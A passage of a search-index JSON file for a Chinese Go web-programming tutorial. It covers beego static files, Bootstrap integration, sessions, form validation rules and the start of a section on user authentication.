StaticDir\u91cc\u9762\u4fdd\u5b58\u7684\u662f\u76f8\u5e94\u7684url\u5bf9\u5e94\u5230\u9759\u6001\u6587\u4ef6\u6240\u5728\u7684\u76ee\u5f55\uff0c\u56e0\u6b64\u5728\u5904\u7406URL\u8bf7\u6c42\u7684\u65f6\u5019\u53ea\u9700\u8981\u5224\u65ad\u5bf9\u5e94\u7684\u8bf7\u6c42\u5730\u5740\u662f\u5426\u5305\u542b\u9759\u6001\u5904\u7406\u5f00\u5934\u7684url\uff0c\u5982\u679c\u5305\u542b\u7684\u8bdd\u5c31\u91c7\u7528http.ServeFile\u63d0\u4f9b\u670d\u52a1\u3002</p> <p>\u4e3e\u4f8b\u5982\u4e0b\uff1a <pre><code>beego.StaticDir[\"/asset\"] = \"/static\"\n</code></pre> \u90a3\u4e48\u8bf7\u6c42url\u5982<code>http://www.beego.me/asset/bootstrap.css</code>\u5c31\u4f1a\u8bf7\u6c42<code>/static/bootstrap.css</code>\u6765\u63d0\u4f9b\u53cd\u9988\u7ed9\u5ba2\u6237\u7aef\u3002  </p>"},{"location":"14.1/#bootstrap","title":"bootstrap\u96c6\u6210","text":"<p>Bootstrap\u662fTwitter\u63a8\u51fa\u7684\u4e00\u4e2a\u5f00\u6e90\u7684\u7528\u4e8e\u524d\u7aef\u5f00\u53d1\u7684\u5de5\u5177\u5305\u3002\u5bf9\u4e8e\u5f00\u53d1\u8005\u6765\u8bf4\uff0cBootstrap\u662f\u5feb\u901f\u5f00\u53d1Web\u5e94\u7528\u7a0b\u5e8f\u7684\u6700\u4f73\u524d\u7aef\u5de5\u5177\u5305\u3002\u5b83\u662f\u4e00\u4e2aCSS\u548cHTML\u7684\u96c6\u5408\uff0c\u5b83\u4f7f\u7528\u4e86\u6700\u65b0\u7684HTML5\u6807\u51c6\uff0c\u7ed9\u4f60\u7684Web\u5f00\u53d1\u63d0\u4f9b\u4e86\u65f6\u5c1a\u7684\u7248\u5f0f\uff0c\u8868\u5355\uff0c\u6309\u94ae\uff0c\u8868\u683c\uff0c\u7f51\u683c\u7cfb\u7edf\u7b49\u7b49\u3002</p> <ul> <li>\u7ec4\u4ef6 \u3000\u3000Bootstrap\u4e2d\u5305\u542b\u4e86\u4e30\u5bcc\u7684Web\u7ec4\u4ef6\uff0c\u6839\u636e\u8fd9\u4e9b\u7ec4\u4ef6\uff0c\u53ef\u4ee5\u5feb\u901f\u7684\u642d\u5efa\u4e00\u4e2a\u6f02\u4eae\u3001\u529f\u80fd\u5b8c\u5907\u7684\u7f51\u7ad9\u3002\u5176\u4e2d\u5305\u62ec\u4ee5\u4e0b\u7ec4\u4ef6\uff1a \u3000\u3000\u4e0b\u62c9\u83dc\u5355\u3001\u6309\u94ae\u7ec4\u3001\u6309\u94ae\u4e0b\u62c9\u83dc\u5355\u3001\u5bfc\u822a\u3001\u5bfc\u822a\u6761\u3001\u9762\u5305\u5c51\u3001\u5206\u9875\u3001\u6392\u7248\u3001\u7f29\u7565\u56fe\u3001\u8b66\u544a\u5bf9\u8bdd\u6846\u3001\u8fdb\u5ea6\u6761\u3001\u5a92\u4f53\u5bf9\u8c61\u7b49</li> <li>Javascript\u63d2\u4ef6 \u3000\u3000Bootstrap\u81ea\u5e26\u4e8613\u4e2ajQuery\u63d2\u4ef6\uff0c\u8fd9\u4e9b\u63d2\u4ef6\u4e3aBootstrap\u4e2d\u7684\u7ec4\u4ef6\u8d4b\u4e88\u4e86\u201c\u751f\u547d\u201d\u3002\u5176\u4e2d\u5305\u62ec\uff1a \u3000\u3000\u6a21\u5f0f\u5bf9\u8bdd\u6846\u3001\u6807\u7b7e\u9875\u3001\u6eda\u52a8\u6761\u3001\u5f39\u51fa\u6846\u7b49\u3002</li> <li>\u5b9a\u5236\u81ea\u5df1\u7684\u6846\u67b6\u4ee3\u7801 \u3000\u3000\u53ef\u4ee5\u5bf9Bootstrap\u4e2d\u6240\u6709\u7684CSS\u53d8\u91cf\u8fdb\u884c\u4fee\u6539\uff0c\u4f9d\u636e\u81ea\u5df1\u7684\u9700\u6c42\u88c1\u526a\u4ee3\u7801\u3002</li> </ul> <p></p> <p>\u56fe14.1 bootstrap\u7ad9\u70b9</p> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u5229\u7528bootstrap\u96c6\u6210\u5230beego\u6846\u67b6\u91cc\u9762\u6765\uff0c\u5feb\u901f\u7684\u5efa\u7acb\u4e00\u4e2a\u6f02\u4eae\u7684\u7ad9\u70b9\u3002</p> <ol> <li> <p>\u9996\u5148\u628a\u4e0b\u8f7d\u7684bootstrap\u76ee\u5f55\u653e\u5230\u6211\u4eec\u7684\u9879\u76ee\u76ee\u5f55\uff0c\u53d6\u540d\u4e3astatic\uff0c\u5982\u4e0b\u622a\u56fe\u6240\u793a</p> <p></p> <p>\u56fe14.2 \u9879\u76ee\u4e2d\u9759\u6001\u6587\u4ef6\u76ee\u5f55\u7ed3\u6784</p> </li> <li> <p>\u56e0\u4e3abeego\u9ed8\u8ba4\u8bbe\u7f6e\u4e86StaticDir\u7684\u503c\uff0c\u6240\u4ee5\u5982\u679c\u4f60\u7684\u9759\u6001\u6587\u4ef6\u76ee\u5f55\u662fstatic\u7684\u8bdd\u5c31\u65e0\u987b\u518d\u589e\u52a0\u4e86\uff1a <pre><code>StaticDir[\"/static\"] = \"static\"\n</code></pre></p> </li> <li>\u6a21\u677f\u4e2d\u4f7f\u7528\u5982\u4e0b\u7684\u5730\u5740\u5c31\u53ef\u4ee5\u4e86\uff1a</li> </ol> <p><pre><code>    //css\u6587\u4ef6\n    &lt;link href=\"/static/css/bootstrap.css\" rel=\"stylesheet\"&gt;\n\n    //js\u6587\u4ef6\n    &lt;script src=\"/static/js/bootstrap-transition.js\"&gt;&lt;/script&gt;\n\n    //\u56fe\u7247\u6587\u4ef6\n    &lt;img src=\"/static/img/logo.png\"&gt;\n</code></pre> \u4e0a\u9762\u53ef\u4ee5\u5b9e\u73b0\u628abootstrap\u96c6\u6210\u5230beego\u4e2d\u6765\uff0c\u5982\u4e0b\u5c55\u793a\u7684\u56fe\u5c31\u662f\u96c6\u6210\u8fdb\u6765\u4e4b\u540e\u7684\u5c55\u73b0\u6548\u679c\u56fe\uff1a</p> <p></p> <p>\u56fe14.3 \u6784\u5efa\u7684\u57fa\u4e8ebootstrap\u7684\u7ad9\u70b9\u754c\u9762</p> <p>\u8fd9\u4e9b\u6a21\u677f\u548c\u683c\u5f0fbootstrap\u5b98\u65b9\u90fd\u6709\u63d0\u4f9b\uff0c\u8fd9\u8fb9\u5c31\u4e0d\u518d\u91cd\u590d\u8d34\u4ee3\u7801\uff0c\u5927\u5bb6\u53ef\u4ee5\u4e0abootstrap\u5b98\u65b9\u7f51\u7ad9\u5b66\u4e60\u5982\u4f55\u7f16\u5199\u6a21\u677f\u3002</p>"},{"location":"14.1/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u6269\u5c55Web\u6846\u67b6</li> <li>\u4e0b\u4e00\u8282: Session\u652f\u6301</li> </ul>"},{"location":"14.2/","title":"14.2 Session\u652f\u6301","text":"<p>\u7b2c\u516d\u7ae0\u7684\u65f6\u5019\u6211\u4eec\u4ecb\u7ecd\u8fc7\u5982\u4f55\u5728Go\u8bed\u8a00\u4e2d\u4f7f\u7528session\uff0c\u4e5f\u5b9e\u73b0\u4e86\u4e00\u4e2asessionManger\uff0cbeego\u6846\u67b6\u57fa\u4e8esessionManager\u5b9e\u73b0\u4e86\u65b9\u4fbf\u7684session\u5904\u7406\u529f\u80fd\u3002</p>"},{"location":"14.2/#session","title":"session\u96c6\u6210","text":"<p>beego\u4e2d\u4e3b\u8981\u6709\u4ee5\u4e0b\u7684\u5168\u5c40\u53d8\u91cf\u6765\u63a7\u5236session\u5904\u7406\uff1a <pre><code>//related to session \nSessionOn            bool   // \u662f\u5426\u5f00\u542fsession\u6a21\u5757\uff0c\u9ed8\u8ba4\u4e0d\u5f00\u542f\nSessionProvider      string // session\u540e\u7aef\u63d0\u4f9b\u5904\u7406\u6a21\u5757\uff0c\u9ed8\u8ba4\u662fsessionManager\u652f\u6301\u7684memory\nSessionName          string // \u5ba2\u6237\u7aef\u4fdd\u5b58\u7684cookies\u7684\u540d\u79f0\nSessionGCMaxLifetime int64  // cookies\u6709\u6548\u671f\n\nGlobalSessions *session.Manager //\u5168\u5c40session\u63a7\u5236\u5668\n</code></pre> \u5f53\u7136\u4e0a\u9762\u8fd9\u4e9b\u53d8\u91cf\u9700\u8981\u521d\u59cb\u5316\u503c\uff0c\u4e5f\u53ef\u4ee5\u6309\u7167\u4e0b\u9762\u7684\u4ee3\u7801\u6765\u914d\u5408\u914d\u7f6e\u6587\u4ef6\u4ee5\u8bbe\u7f6e\u8fd9\u4e9b\u503c\uff1a <pre><code>if ar, err := AppConfig.Bool(\"sessionon\"); err != nil {\nSessionOn = false\n} else {\nSessionOn = ar\n}\nif ar := AppConfig.String(\"sessionprovider\"); ar == \"\" {\nSessionProvider = \"memory\"\n} else {\nSessionProvider = ar\n}\nif ar := AppConfig.String(\"sessionname\"); ar == \"\" {\nSessionName = \"beegosessionID\"\n} else {\nSessionName = ar\n}\nif ar, err := AppConfig.Int(\"sessiongcmaxlifetime\"); err != nil &amp;&amp; ar != 0 {\nint64val, _ := strconv.ParseInt(strconv.Itoa(ar), 10, 64)\nSessionGCMaxLifetime = int64val\n} else {\nSessionGCMaxLifetime = 3600\n}   </code></pre> \u5728beego.Run\u51fd\u6570\u4e2d\u589e\u52a0\u5982\u4e0b\u4ee3\u7801\uff1a <pre><code>if SessionOn {\nGlobalSessions, _ = session.NewManager(SessionProvider, SessionName, SessionGCMaxLifetime)\ngo GlobalSessions.GC()\n}\n</code></pre> \u8fd9\u6837\u53ea\u8981SessionOn\u8bbe\u7f6e\u4e3atrue\uff0c\u90a3\u4e48\u5c31\u4f1a\u9ed8\u8ba4\u5f00\u542fsession\u529f\u80fd\uff0c\u72ec\u7acb\u5f00\u4e00\u4e2agoroutine\u6765\u5904\u7406session\u3002</p> <p>\u4e3a\u4e86\u65b9\u4fbf\u6211\u4eec\u5728\u81ea\u5b9a\u4e49Controller\u4e2d\u5feb\u901f\u4f7f\u7528session\uff0c\u4f5c\u8005\u5728<code>beego.Controller</code>\u4e2d\u63d0\u4f9b\u4e86\u5982\u4e0b\u65b9\u6cd5\uff1a <pre><code>func (c *Controller) StartSession() (sess session.Session) {\nsess = GlobalSessions.SessionStart(c.Ctx.ResponseWriter, c.Ctx.Request)\nreturn\n}       </code></pre></p>"},{"location":"14.2/#session_1","title":"session\u4f7f\u7528","text":"<p>\u901a\u8fc7\u4e0a\u9762\u7684\u4ee3\u7801\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0cbeego\u6846\u67b6\u7b80\u5355\u5730\u7ee7\u627f\u4e86session\u529f\u80fd\uff0c\u90a3\u4e48\u5728\u9879\u76ee\u4e2d\u5982\u4f55\u4f7f\u7528\u5462\uff1f</p> <p>\u9996\u5148\u6211\u4eec\u9700\u8981\u5728\u5e94\u7528\u7684main\u5165\u53e3\u5904\u5f00\u542fsession\uff1a <pre><code>beego.SessionOn = true\n</code></pre></p> <p>\u7136\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u5728\u63a7\u5236\u5668\u7684\u76f8\u5e94\u65b9\u6cd5\u4e2d\u5982\u4e0b\u6240\u793a\u7684\u4f7f\u7528session\u4e86\uff1a      <pre><code>func (this *MainController) Get() {\nvar intcount int\nsess := this.StartSession()\ncount := sess.Get(\"count\")\nif count == nil {\nintcount = 0\n} else {\nintcount = count.(int)\n}\nintcount = intcount + 1\nsess.Set(\"count\", intcount)\nthis.Data[\"Username\"] = \"astaxie\"\nthis.Data[\"Email\"] = \"astaxie@gmail.com\"\nthis.Data[\"Count\"] = intcount\nthis.TplNames = \"index.tpl\"\n}\n</code></pre> \u4e0a\u9762\u7684\u4ee3\u7801\u5c55\u793a\u4e86\u5982\u4f55\u5728\u63a7\u5236\u903b\u8f91\u4e2d\u4f7f\u7528session\uff0c\u4e3b\u8981\u5206\u4e24\u4e2a\u6b65\u9aa4\uff1a</p> <ol> <li>\u83b7\u53d6session\u5bf9\u8c61</li> </ol> <pre><code>    //\u83b7\u53d6\u5bf9\u8c61,\u7c7b\u4f3cPHP\u4e2d\u7684session_start()\nsess := this.StartSession()\n</code></pre> <ol> <li>\u4f7f\u7528session\u8fdb\u884c\u4e00\u822c\u7684session\u503c\u64cd\u4f5c</li> </ol> <p><pre><code>    //\u83b7\u53d6session\u503c\uff0c\u7c7b\u4f3cPHP\u4e2d\u7684$_SESSION[\"count\"]\nsess.Get(\"count\")\n\n//\u8bbe\u7f6esession\u503c\nsess.Set(\"count\", intcount)\n</code></pre> \u4ece\u4e0a\u9762\u4ee3\u7801\u53ef\u4ee5\u770b\u51fa\u57fa\u4e8ebeego\u6846\u67b6\u5f00\u53d1\u7684\u5e94\u7528\u4e2d\u4f7f\u7528session\u76f8\u5f53\u65b9\u4fbf\uff0c\u57fa\u672c\u4e0a\u548cPHP\u4e2d\u8c03\u7528<code>session_start()</code>\u7c7b\u4f3c\u3002</p>"},{"location":"14.2/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u9759\u6001\u6587\u4ef6\u652f\u6301</li> <li>\u4e0b\u4e00\u8282: \u8868\u5355\u53ca\u9a8c\u8bc1\u652f\u6301</li> </ul>"},{"location":"14.3/","title":"14.3 \u8868\u5355\u53ca\u9a8c\u8bc1\u652f\u6301","text":""},{"location":"14.3/#143","title":"14.3 \u8868\u5355\u53ca\u9a8c\u8bc1\u652f\u6301","text":"<p>\u5728Web\u5f00\u53d1\u4e2d\u5bf9\u4e8e\u8fd9\u6837\u7684\u4e00\u4e2a\u6d41\u7a0b\u53ef\u80fd\u5f88\u773c\u719f\uff1a</p> <ul> <li>\u6253\u5f00\u4e00\u4e2a\u7f51\u9875\u663e\u793a\u51fa\u8868\u5355\u3002</li> <li>\u7528\u6237\u586b\u5199\u5e76\u63d0\u4ea4\u4e86\u8868\u5355\u3002</li> <li>\u5982\u679c\u7528\u6237\u63d0\u4ea4\u4e86\u4e00\u4e9b\u65e0\u6548\u7684\u4fe1\u606f\uff0c\u6216\u8005\u53ef\u80fd\u6f0f\u6389\u4e86\u4e00\u4e2a\u5fc5\u586b\u9879\uff0c\u8868\u5355\u5c06\u4f1a\u8fde\u540c\u7528\u6237\u7684\u6570\u636e\u548c\u9519\u8bef\u95ee\u9898\u7684\u63cf\u8ff0\u4fe1\u606f\u8fd4\u56de\u3002</li> <li>\u7528\u6237\u518d\u6b21\u586b\u5199\uff0c\u7ee7\u7eed\u4e0a\u4e00\u6b65\u8fc7\u7a0b\uff0c\u76f4\u5230\u63d0\u4ea4\u4e86\u4e00\u4e2a\u6709\u6548\u7684\u8868\u5355\u3002</li> </ul> <p>\u5728\u63a5\u6536\u7aef\uff0c\u811a\u672c\u5fc5\u987b\uff1a</p> <ul> <li>\u68c0\u67e5\u7528\u6237\u9012\u4ea4\u7684\u8868\u5355\u6570\u636e\u3002</li> <li>\u9a8c\u8bc1\u6570\u636e\u662f\u5426\u4e3a\u6b63\u786e\u7684\u7c7b\u578b\uff0c\u5408\u9002\u7684\u6807\u51c6\u3002\u4f8b\u5982\uff0c\u5982\u679c\u4e00\u4e2a\u7528\u6237\u540d\u88ab\u63d0\u4ea4\uff0c\u5b83\u5fc5\u987b\u88ab\u9a8c\u8bc1\u662f\u5426\u53ea\u5305\u542b\u4e86\u5141\u8bb8\u7684\u5b57\u7b26\u3002\u5b83\u5fc5\u987b\u6709\u4e00\u4e2a\u6700\u5c0f\u957f\u5ea6\uff0c\u4e0d\u80fd\u8d85\u8fc7\u6700\u5927\u957f\u5ea6\u3002\u7528\u6237\u540d\u4e0d\u80fd\u4e0e\u5df2\u5b58\u5728\u7684\u4ed6\u4eba\u7528\u6237\u540d\u91cd\u590d\uff0c\u751a\u81f3\u662f\u4e00\u4e2a\u4fdd\u7559\u5b57\u7b49\u3002</li> <li>\u8fc7\u6ee4\u6570\u636e\u5e76\u6e05\u7406\u4e0d\u5b89\u5168\u5b57\u7b26\uff0c\u4fdd\u8bc1\u903b\u8f91\u5904\u7406\u4e2d\u63a5\u6536\u7684\u6570\u636e\u662f\u5b89\u5168\u7684\u3002</li> <li>\u5982\u679c\u9700\u8981\uff0c\u9884\u683c\u5f0f\u5316\u6570\u636e\uff08\u6570\u636e\u9700\u8981\u6e05\u9664\u7a7a\u767d\u6216\u8005\u7ecf\u8fc7HTML\u7f16\u7801\u7b49\u7b49\u3002\uff09</li> <li>\u51c6\u5907\u597d\u6570\u636e\uff0c\u63d2\u5165\u6570\u636e\u5e93\u3002</li> </ul> <p>\u5c3d\u7ba1\u4e0a\u9762\u7684\u8fc7\u7a0b\u5e76\u4e0d\u662f\u5f88\u590d\u6742\uff0c\u4f46\u662f\u901a\u5e38\u60c5\u51b5\u4e0b\u9700\u8981\u7f16\u5199\u5f88\u591a\u4ee3\u7801\uff0c\u800c\u4e14\u4e3a\u4e86\u663e\u793a\u9519\u8bef\u4fe1\u606f\uff0c\u5728\u7f51\u9875\u4e2d\u7ecf\u5e38\u8981\u4f7f\u7528\u591a\u79cd\u4e0d\u540c\u7684\u63a7\u5236\u7ed3\u6784\u3002\u521b\u5efa\u8868\u5355\u9a8c\u8bc1\u867d\u7b80\u5355\uff0c\u5b9e\u65bd\u8d77\u6765\u5b9e\u5728\u67af\u71e5\u65e0\u5473\u3002</p>"},{"location":"14.3/#_1","title":"\u8868\u5355\u548c\u9a8c\u8bc1","text":"<p>\u5bf9\u4e8e\u5f00\u53d1\u8005\u6765\u8bf4\uff0c\u4e00\u822c\u5f00\u53d1\u8fc7\u7a0b\u90fd\u662f\u76f8\u5f53\u590d\u6742\uff0c\u800c\u4e14\u5927\u591a\u662f\u5728\u91cd\u590d\u4e00\u6837\u7684\u5de5\u4f5c\u3002\u5047\u8bbe\u4e00\u4e2a\u573a\u666f\u9879\u76ee\u4e2d\u5ffd\u7136\u9700\u8981\u589e\u52a0\u4e00\u4e2a\u8868\u5355\u6570\u636e\uff0c\u90a3\u4e48\u5c40\u90e8\u4ee3\u7801\u7684\u6574\u4e2a\u6d41\u7a0b\u90fd\u9700\u8981\u4fee\u6539\u3002\u6211\u4eec\u77e5\u9053Go\u91cc\u9762struct\u662f\u5e38\u7528\u7684\u4e00\u4e2a\u6570\u636e\u7ed3\u6784\uff0c\u56e0\u6b64beego\u7684form\u91c7\u7528\u4e86struct\u6765\u5904\u7406\u8868\u5355\u4fe1\u606f\u3002</p> <p>\u9996\u5148\u5b9a\u4e49\u4e00\u4e2a\u5f00\u53d1Web\u5e94\u7528\u65f6\u76f8\u5bf9\u5e94\u7684struct\uff0c\u4e00\u4e2a\u5b57\u6bb5\u5bf9\u5e94\u4e00\u4e2aform\u5143\u7d20\uff0c\u901a\u8fc7struct\u7684tag\u6765\u5b9a\u4e49\u76f8\u5e94\u7684\u5143\u7d20\u4fe1\u606f\u548c\u9a8c\u8bc1\u4fe1\u606f\uff0c\u5982\u4e0b\u6240\u793a\uff1a <pre><code>type User struct{\nUsername    string  `form:text,valid:required`\nNickname    string  `form:text,valid:required`\nAge         int     `form:text,valid:required|numeric`\nEmail       string  `form:text,valid:required|valid_email`\nIntroduce   string  `form:textarea`\n}\n</code></pre> \u5b9a\u4e49\u597dstruct\u4e4b\u540e\u63a5\u4e0b\u6765\u5728controller\u4e2d\u8fd9\u6837\u64cd\u4f5c <pre><code>func (this *AddController) Get() {\nthis.Data[\"form\"] = beego.Form(&amp;User{})\nthis.Layout = \"admin/layout.html\"\nthis.TplNames = \"admin/add.tpl\"\n}       </code></pre> \u5728\u6a21\u677f\u4e2d\u8fd9\u6837\u663e\u793a\u8868\u5355 <pre><code>&lt;h1&gt;New Blog Post&lt;/h1&gt;\n&lt;form action=\"\" method=\"post\"&gt;\n{{.form.render()}}\n&lt;/form&gt;\n</code></pre> \u4e0a\u9762\u6211\u4eec\u5b9a\u4e49\u597d\u4e86\u6574\u4e2a\u7684\u7b2c\u4e00\u6b65\uff0c\u4ecestruct\u5230\u663e\u793a\u8868\u5355\u7684\u8fc7\u7a0b\uff0c\u63a5\u4e0b\u6765\u5c31\u662f\u7528\u6237\u586b\u5199\u4fe1\u606f\uff0c\u670d\u52a1\u5668\u7aef\u63a5\u6536\u6570\u636e\u7136\u540e\u9a8c\u8bc1\uff0c\u6700\u540e\u63d2\u5165\u6570\u636e\u5e93\u3002 <pre><code>func (this *AddController) Post() {\nvar user User\nform := this.GetInput(&amp;user)\nif !form.Validates() {\nreturn\n}\nmodels.UserInsert(&amp;user)\nthis.Ctx.Redirect(302, \"/admin/index\")\n}       </code></pre></p>"},{"location":"14.3/#_2","title":"\u8868\u5355\u7c7b\u578b","text":"<p>\u4ee5\u4e0b\u5217\u8868\u5217\u51fa\u6765\u4e86\u5bf9\u5e94\u7684form\u5143\u7d20\u4fe1\u606f\uff1a</p> \u540d\u79f0 \u53c2\u6570 \u529f\u80fd\u63cf\u8ff0 text No textbox\u8f93\u5165\u6846 button No \u6309\u94ae checkbox No \u591a\u9009\u62e9\u6846 dropdown No \u4e0b\u62c9\u9009\u62e9\u6846 file No \u6587\u4ef6\u4e0a\u4f20 hidden No \u9690\u85cf\u5143\u7d20 password No \u5bc6\u7801\u8f93\u5165\u6846 radio No \u5355\u9009\u6846 textarea No \u6587\u672c\u8f93\u5165\u6846"},{"location":"14.3/#_3","title":"\u8868\u5355\u9a8c\u8bc1","text":"<p>\u4ee5\u4e0b\u5217\u8868\u5c06\u5217\u51fa\u53ef\u88ab\u4f7f\u7528\u7684\u539f\u751f\u89c4\u5219</p> \u89c4\u5219 \u53c2\u6570 \u63cf\u8ff0 \u4e3e\u4f8b required No \u5982\u679c\u5143\u7d20\u4e3a\u7a7a\uff0c\u5219\u8fd4\u56deFALSE matches Yes \u5982\u679c\u8868\u5355\u5143\u7d20\u7684\u503c\u4e0e\u53c2\u6570\u4e2d\u5bf9\u5e94\u7684\u8868\u5355\u5b57\u6bb5\u7684\u503c\u4e0d\u76f8\u7b49\uff0c\u5219\u8fd4\u56deFALSE matches[form_item] is_unique Yes \u5982\u679c\u8868\u5355\u5143\u7d20\u7684\u503c\u4e0e\u6307\u5b9a\u6570\u636e\u8868\u680f\u4f4d\u6709\u91cd\u590d\uff0c\u5219\u8fd4\u56deFalse\uff08\u8bd1\u8005\u6ce8\uff1a\u6bd4\u5982is_unique[User.Email]\uff0c\u90a3\u4e48\u9a8c\u8bc1\u7c7b\u4f1a\u53bb\u67e5\u627eUser\u8868\u4e2dEmail\u680f\u4f4d\u6709\u6ca1\u6709\u4e0e\u8868\u5355\u5143\u7d20\u4e00\u6837\u7684\u503c\uff0c\u5982\u5b58\u91cd\u590d\uff0c\u5219\u8fd4\u56defalse\uff0c\u8fd9\u6837\u5f00\u53d1\u8005\u5c31\u4e0d\u5fc5\u53e6\u5199Callback\u9a8c\u8bc1\u4ee3\u7801\u3002\uff09 is_unique[table.field] min_length Yes \u5982\u679c\u8868\u5355\u5143\u7d20\u503c\u7684\u5b57\u7b26\u957f\u5ea6\u5c11\u4e8e\u53c2\u6570\u4e2d\u5b9a\u4e49\u7684\u6570\u5b57\uff0c\u5219\u8fd4\u56deFALSE min_length[6] max_length Yes \u5982\u679c\u8868\u5355\u5143\u7d20\u503c\u7684\u5b57\u7b26\u957f\u5ea6\u5927\u4e8e\u53c2\u6570\u4e2d\u5b9a\u4e49\u7684\u6570\u5b57\uff0c\u5219\u8fd4\u56deFALSE max_length[12] exact_length Yes \u5982\u679c\u8868\u5355\u5143\u7d20\u503c\u7684\u5b57\u7b26\u957f\u5ea6\u4e0e\u53c2\u6570\u4e2d\u5b9a\u4e49\u7684\u6570\u5b57\u4e0d\u7b26\uff0c\u5219\u8fd4\u56deFALSE exact_length[8] greater_than Yes \u5982\u679c\u8868\u5355\u5143\u7d20\u503c\u662f\u975e\u6570\u5b57\u7c7b\u578b\uff0c\u6216\u5c0f\u4e8e\u53c2\u6570\u5b9a\u4e49\u7684\u503c\uff0c\u5219\u8fd4\u56deFALSE greater_than[8] less_than Yes \u5982\u679c\u8868\u5355\u5143\u7d20\u503c\u662f\u975e\u6570\u5b57\u7c7b\u578b\uff0c\u6216\u5927\u4e8e\u53c2\u6570\u5b9a\u4e49\u7684\u503c\uff0c\u5219\u8fd4\u56deFALSE less_than[8] alpha No \u5982\u679c\u8868\u5355\u5143\u7d20\u503c\u4e2d\u5305\u542b\u9664\u5b57\u6bcd\u4ee5\u5916\u7684\u5176\u4ed6\u5b57\u7b26\uff0c\u5219\u8fd4\u56deFALSE alpha_numeric No \u5982\u679c\u8868\u5355\u5143\u7d20\u503c\u4e2d\u5305\u542b\u9664\u5b57\u6bcd\u548c\u6570\u5b57\u4ee5\u5916\u7684\u5176\u4ed6\u5b57\u7b26\uff0c\u5219\u8fd4\u56deFALSE alpha_dash No \u5982\u679c\u8868\u5355\u5143\u7d20\u503c\u4e2d\u5305\u542b\u9664\u5b57\u6bcd/\u6570\u5b57/\u4e0b\u5212\u7ebf/\u7834\u6298\u53f7\u4ee5\u5916\u7684\u5176\u4ed6\u5b57\u7b26\uff0c\u5219\u8fd4\u56deFALSE numeric No \u5982\u679c\u8868\u5355\u5143\u7d20\u503c\u4e2d\u5305\u542b\u9664\u6570\u5b57\u4ee5\u5916\u7684\u5b57\u7b26\uff0c\u5219\u8fd4\u56de FALSE integer No \u5982\u679c\u8868\u5355\u5143\u7d20\u4e2d\u5305\u542b\u9664\u6574\u6570\u4ee5\u5916\u7684\u5b57\u7b26\uff0c\u5219\u8fd4\u56deFALSE decimal Yes \u5982\u679c\u8868\u5355\u5143\u7d20\u4e2d\u8f93\u5165\uff08\u975e\u5c0f\u6570\uff09\u4e0d\u5b8c\u6574\u7684\u503c\uff0c\u5219\u8fd4\u56deFALSE is_natural No \u5982\u679c\u8868\u5355\u5143\u7d20\u503c\u4e2d\u5305\u542b\u4e86\u975e\u81ea\u7136\u6570\u7684\u5176\u4ed6\u6570\u503c \uff08\u5176\u4ed6\u6570\u503c\u4e0d\u5305\u62ec\u96f6\uff09\uff0c\u5219\u8fd4\u56deFALSE\u3002\u81ea\u7136\u6570\u5f62\u5982\uff1a0,1,2,3....\u7b49\u7b49\u3002 is_natural_no_zero No \u5982\u679c\u8868\u5355\u5143\u7d20\u503c\u5305\u542b\u4e86\u975e\u81ea\u7136\u6570\u7684\u5176\u4ed6\u6570\u503c \uff08\u5176\u4ed6\u6570\u503c\u5305\u62ec\u96f6\uff09\uff0c\u5219\u8fd4\u56deFALSE\u3002\u975e\u96f6\u7684\u81ea\u7136\u6570\uff1a1,2,3.....\u7b49\u7b49\u3002 valid_email No \u5982\u679c\u8868\u5355\u5143\u7d20\u503c\u5305\u542b\u4e0d\u5408\u6cd5\u7684email\u5730\u5740\uff0c\u5219\u8fd4\u56deFALSE valid_emails No \u5982\u679c\u8868\u5355\u5143\u7d20\u503c\u4e2d\u4efb\u4f55\u4e00\u4e2a\u503c\u5305\u542b\u4e0d\u5408\u6cd5\u7684email\u5730\u5740\uff08\u5730\u5740\u4e4b\u95f4\u7528\u82f1\u6587\u9017\u53f7\u5206\u5272\uff09\uff0c\u5219\u8fd4\u56deFALSE\u3002 valid_ip No \u5982\u679c\u8868\u5355\u5143\u7d20\u7684\u503c\u4e0d\u662f\u4e00\u4e2a\u5408\u6cd5\u7684IP\u5730\u5740\uff0c\u5219\u8fd4\u56deFALSE\u3002 valid_base64 No \u5982\u679c\u8868\u5355\u5143\u7d20\u7684\u503c\u5305\u542b\u9664\u4e86base64 \u7f16\u7801\u5b57\u7b26\u4e4b\u5916\u7684\u5176\u4ed6\u5b57\u7b26\uff0c\u5219\u8fd4\u56deFALSE\u3002"},{"location":"14.3/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: Session\u652f\u6301</li> <li>\u4e0b\u4e00\u8282: \u7528\u6237\u8ba4\u8bc1</li> </ul>"},{"location":"14.4/","title":"14.4 \u7528\u6237\u8ba4\u8bc1","text":"<p>\u5728\u5f00\u53d1Web\u5e94\u7528\u8fc7\u7a0b\u4e2d\uff0c\u7528\u6237\u8ba4\u8bc1\u662f\u5f00\u53d1\u8005\u7ecf\u5e38\u9047\u5230\u7684\u95ee\u9898\uff0c\u7528\u6237\u767b\u5f55\u3001\u6ce8\u518c\u3001\u767b\u51fa\u7b49\u64cd\u4f5c\uff0c\u800c\u4e00\u822c\u8ba4\u8bc1\u4e5f\u5206\u4e3a\u4e09\u4e2a\u65b9\u9762\u7684\u8ba4\u8bc1</p> <ul> <li>HTTP Basic\u548c HTTP Digest\u8ba4\u8bc1</li> <li>\u7b2c\u4e09\u65b9\u96c6\u6210\u8ba4\u8bc1\uff1aQQ\u3001\u5fae\u535a\u3001\u8c46\u74e3\u3001OPENID\u3001google\u3001GitHub\u3001facebook\u548ctwitter\u7b49</li> <li>\u81ea\u5b9a\u4e49\u7684\u7528\u6237\u767b\u5f55\u3001\u6ce8\u518c\u3001\u767b\u51fa\uff0c\u4e00\u822c\u90fd\u662f\u57fa\u4e8esession\u3001cookie\u8ba4\u8bc1</li> </ul> 